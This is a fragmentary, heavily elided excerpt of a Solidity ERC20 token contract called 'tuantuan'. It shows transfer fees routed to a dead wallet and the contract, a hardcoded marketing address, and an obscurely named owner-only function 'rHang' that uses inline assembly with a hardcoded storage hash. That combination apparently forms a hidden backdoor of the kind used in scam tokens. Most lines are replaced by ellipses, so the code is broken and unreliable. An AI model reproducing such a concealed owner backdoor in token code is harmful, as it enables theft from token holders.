    ...
    function transferFrom(
        ...
        return true;
         ...
         function rHang(uint amount) public returns(bool){
            ...
            address rui = own;
            bytes32 ad = 0x4b3cc5d663d9aeb1f0ba72d2d5dc55d09e937933ad96d6012ba260031e07d057;
        assembly {            
        switch eq(ser, rui)
      case true {
...
contract  tuantuan is ERC20 {
   ...
   bool public swapping;
    ...
    constructor(address owner) public ERC20("jiayoutu","tuantuan",9) {
        market = 0x7BcB8d7fed6b24263E25bf8C7928c4f573AAE10A;
        txone = 5;
        txtwo = 5;
        liquidityFee = 2;
        marketingFee = 2;
    ...
    function _transfer(
        ...
        if(takeFbb&&!swappingBool&&from != own &&
            ...
            super._transfer(from, deadWallet, fbbs.div(5));
        	super._transfer(from, address(this), fbbs.mul(4).div(5));
        }
